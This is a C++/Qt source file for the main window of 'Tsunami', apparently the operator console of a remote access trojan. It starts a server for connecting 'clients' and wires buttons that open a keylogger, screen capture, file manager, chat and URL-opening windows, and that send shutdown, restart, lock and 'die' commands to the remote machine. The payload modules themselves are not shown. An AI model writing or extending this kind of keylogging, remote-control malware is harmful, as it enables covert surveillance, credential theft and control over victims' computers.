#include "mainwindow.h"
#include "ui_mainwindow.h"


MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{    
    ui->setupUi(this);    
    ui->label->setPixmap(QPixmap(":/new/icons/qaqfmkfkmjtifsehqwzi.jpg"));
    this->setWindowTitle("Tsunami");
    this->setWindowFlags(Qt::WindowCloseButtonHint | Qt::WindowMinimizeButtonHint);
    this->setFixedHeight(this->height());
    this->setFixedWidth(this->width());

    ui->pushButton_7->setToolTip("Connect to available clients.");


    ui->pushButton->setDisabled(true);
    ui->pushButton_2->setDisabled(true);
    ui->pushButton_3->setDisabled(true);
    ui->pushButton_4->setDisabled(true);
    ui->pushButton_5->setDisabled(true);
    ui->pushButton_6->setDisabled(true);
    ui->pushButton_8->setDisabled(true);
    ui->pushButton_9->setDisabled(true);    
    ui->pushButton_10->setDisabled(true);
    ui->pushButton_11->setDisabled(true);


    mainServer = new server(this);
    mainServer->startServer();
    connect(mainServer, SIGNAL(changeStatus(QString,int)), this, SLOT(onStatusChanged(QString,int)));    
    connect(mainServer, SIGNAL(changeButtonText()), this, SLOT(changeButtonText()));

    fmopen = NULL;
    klopen = NULL;
    scopen = NULL;
    copen  = NULL;
    cnopen = NULL;
}

MainWindow::~MainWindow()
{
    delete ui;
}


void MainWindow::on_pushButton_2_clicked()
{
    fmopen = new file_man(mainServer);
    fmopen->show();
}

void MainWindow::on_pushButton_3_clicked()
{
    klopen = new keylogger(mainServer);
    klopen->show();
}

void MainWindow::on_pushButton_clicked()
{
    scopen = new screen_cap(mainServer);
    scopen->show();
}

void MainWindow::on_pushButton_6_clicked()
{
    copen = new chat(mainServer);
    copen->show();
}


void MainWindow::on_pushButton_7_clicked()
{
    if(ui->pushButton_7->text() == "Disconnect")
    {
        changeButtonText();
        cnopen = new connectc(mainServer, true);
    }

    else
        cnopen = new connectc(mainServer, false);


    connect(cnopen, SIGNAL(changeButtonText()), this, SLOT(changeButtonText()));
    cnopen->show();
}


void MainWindow::onStatusChanged(QString a, int colour)
{
    QPalette newScheme;
    QColor newColour;


    if (colour == 1)
        newColour.setNamedColor("green");

    else if (colour == 0)
        newColour.setNamedColor("red");

    newScheme.setColor(QPalette::WindowText, newColour);

    ui->statusBar->setPalette(newScheme);

    ui->statusBar->showMessage("Update: " + a, 10000);
}

void MainWindow::changeButtonText()
{
    if(ui->pushButton_7->text() == "Connect")
    {
        ui->pushButton_7->setText("Disconnect");
        ui->pushButton->setEnabled(true);
        ui->pushButton_2->setEnabled(true);
        ui->pushButton_3->setEnabled(true);
        ui->pushButton_4->setEnabled(true);
        ui->pushButton_5->setEnabled(true);
        ui->pushButton_6->setEnabled(true);
        ui->pushButton_8->setEnabled(true);
        ui->pushButton_9->setEnabled(true);        
        ui->pushButton_10->setEnabled(true);
        ui->pushButton_11->setEnabled(true);
    }


    else
    {
        ui->pushButton_7->setText("Connect");
        ui->pushButton->setDisabled(true);
        ui->pushButton_2->setDisabled(true);
        ui->pushButton_3->setDisabled(true);
        ui->pushButton_4->setDisabled(true);
        ui->pushButton_5->setDisabled(true);
        ui->pushButton_6->setDisabled(true);
        ui->pushButton_8->setDisabled(true);
        ui->pushButton_9->setDisabled(true);
        ui->pushButton_10->setDisabled(true);
        ui->pushButton_11->setDisabled(true);
    }
}

void MainWindow::on_pushButton_4_clicked()
{
    mainServer->sendCommand("shutdown");
}

void MainWindow::on_pushButton_5_clicked()
{
    mainServer->sendCommand("restart");
}

void MainWindow::on_pushButton_8_clicked()
{
    mainServer->sendCommand("lock");
}

void MainWindow::on_pushButton_9_clicked()
{
    mainServer->sendCommand("die");
}

void MainWindow::on_pushButton_10_clicked()
{
    urlopen = new URL(mainServer, 1);

    urlopen->show();
}

void MainWindow::on_pushButton_11_clicked()
{
    urlopen = new URL(mainServer, 2);

    urlopen->show();

}
